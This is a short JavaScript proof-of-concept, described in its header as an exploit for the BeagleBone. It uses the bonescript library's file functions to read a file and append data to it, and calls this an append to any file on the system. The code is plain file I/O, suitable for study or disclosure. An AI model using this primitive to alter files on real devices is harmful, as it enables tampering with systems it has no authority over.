/**
This is a POC implementation of an exploit for the BeagleBone using bonescript.
This file implements an append function on any file in the system.
*/

var b = require('bonescript');
// file to be changed
var file = '/home/debian/out.txt';
// this is the data read
let output = '';
// this is the data to append
let append = 'datatoappend\n'

// this function reads file and outputs data in the output variable
b.readTextFile(file, function (x){
    output = x.data;
    console.log('inside method output of x'+output);
});

// this function writes data to a file
// this function is delayed so it does not write before read is completed
setTimeout(function(){ 
     console.log("output of x:  "+output);
    b.writeTextFile(file, output+append, readStatus);
}, 3000); 

function readStatus(x) {
    console.log(JSON.stringify(x));
}